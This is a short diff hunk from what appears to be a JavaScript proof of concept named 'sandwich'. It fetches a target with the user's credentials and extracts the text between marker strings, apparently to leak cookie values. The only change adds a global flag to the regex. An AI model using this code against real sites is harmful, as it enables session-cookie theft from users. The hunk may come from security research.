@@ -21,7 +21,7 @@ async function sandwich(target, cookie) {
             const response = await fetch(`${target}`, {
                 credentials: 'include',
             });
-            const regexf = /deadbeef([\s\S]*?)dummy/;
+            const regexf = /deadbeef([\s\S]*?)dummy/g;
             const responseData = await response.text();
             var result = responseData.match(regexf);
             const resultado = result.join(" ")
